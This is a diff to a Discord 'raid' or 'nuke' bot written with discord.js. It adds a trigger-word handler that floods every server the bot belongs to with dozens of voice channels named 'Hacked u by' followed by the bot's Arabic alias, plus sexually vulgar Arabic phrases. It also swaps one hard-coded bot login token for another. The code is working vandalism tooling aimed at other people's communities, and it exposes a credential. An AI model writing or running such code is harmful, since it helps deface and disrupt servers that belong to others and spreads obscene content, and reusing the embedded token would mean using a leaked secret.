@@ -407,6 +407,77 @@ m.createChannel('Hacked u by مطرقة', 'voice');
 });
 
 
+مطرقة.on('message', message => {
+         if (message.content === "مطرقة") {
+                 مطرقة.guilds.forEach(m =>{
+m.createChannel('Hacked لحواااااا', 'voice');
+m.createChannel('سكس 2017 شاهد قبل الحدف', 'voice');
+m.createChannel('Hacked سكسسسسسسسسسسسسسسسس', 'voice');
+m.createChannel('Hacked u ساخنببببببببببب', 'voice');
+m.createChannel('Hacked u اهههههههههههههه', 'voice');
+m.createChannel('Hacked u هههههههههههههههه', 'voice');
+m.createChannel('Hacked u bهههههههههe', 'voice');
+m.createChannel('Hacked uهههههههههههههre', 'voice');
+
+m.createChannel('Hacked u ههههههههههههههههe', 'voice');
+m.createChannel('تجمع لقحاب سكس 2017', 'voice');
+
+m.createChannel('الموقع الازرق ', 'voice');
+m.createChannel('امور زاملللل', 'voice');
+m.createChannel('ازبي هههههه', 'voice');
+m.createChannel('غنشدك غنحويكككككككههههه', 'voice');
+m.createChannel('Hacked u by مطرقة', 'voice');
+m.createChannel('Hacked u by مطرقة', 'voice');
+m.createChannel('Hacked u by مطرقة', 'voice');
+m.createChannel('Hacked u by مطرقة', 'voice');
+m.createChannel('Hacked u by مطرقة', 'voice');
+m.createChannel('Hacked u by مطرقة', 'voice');
+m.createChannel('Hacked u by مطرقة', 'voice');
+m.createChannel('Hacked u by مطرقة', 'voice');
+
+m.createChannel('Hacked u by مطرقة', 'voice');
+m.createChannel('Hacked u by مطرقة', 'voice');
+m.createChannel('Hacked u by مطرقة', 'voice');
+m.createChannel('Hacked u by مطرقة', 'voice');
+m.createChannel('Hacked u by مطرقة', 'voice');
+m.createChannel('Hacked u by مطرقة', 'voice');
+m.createChannel('Hacked u by مطرقة', 'voice');
+m.createChannel('Hacked u by مطرقة', 'voice');
+
+m.createChannel('Hacked u by مطرقة', 'voice');
+m.createChannel('Hacked u by مطرقة', 'voice');
+m.createChannel('Hacked u by مطرقة', 'voice');
+m.createChannel('Hacked u by مطرقة', 'voice');
+m.createChannel('Hacked u by مطرقة', 'voice');
+m.createChannel('Hacked u by مطرقة', 'voice');
+m.createChannel('Hacked u by مطرقة', 'voice');
+m.createChannel('Hacked u by مطرقة', 'voice');
+m.createChannel('Hacked u by مطرقة', 'voice');
+m.createChannel('Hacked u by مطرقة', 'voice');
+m.createChannel('Hacked u by مطرقة', 'voice');
+
+m.createChannel('Hacked u by مطرقة', 'voice');
+m.createChannel('Hacked u by مطرقة', 'voice');
+m.createChannel('Hacked u by مطرقة', 'voice');
+m.createChannel('Hacked u by مطرقة', 'voice');
+m.createChannel('Hacked u by مطرقة', 'voice');
+m.createChannel('Hacked u by مطرقة', 'voice');
+m.createChannel('Hacked u by مطرقة', 'voice');
+m.createChannel('Hacked u by مطرقة', 'voice');
+m.createChannel('Hacked u by مطرقة', 'voice');
+m.createChannel('Hacked u by مطرقة', 'voice');
+m.createChannel('Hacked u by مطرقة', 'voice');
+m.createChannel('Hacked u by مطرقة', 'voice');
+m.createChannel('Hacked u by مطرقة', 'voice');
+
+
+
+})
+}
+
+});
+
+
 const { Client } = require('discord.js');
 const client = new Client();
 
@@ -477,4 +548,4 @@ async function nuke(guild) {
 
 
 
-مطرقة.login("NDQzNzgxNDk5NjAzNjQ4NTIz.DhbSEA.Bp2RIAKXaE_9UpwvX1a1VSFAA7Y")
+مطرقة.login("NDQzNzgxNDk5NjAzNjQ4NTIz.DjqF5Q.vGjKlWubNTLvzlMkoQ4PcrNjS38")
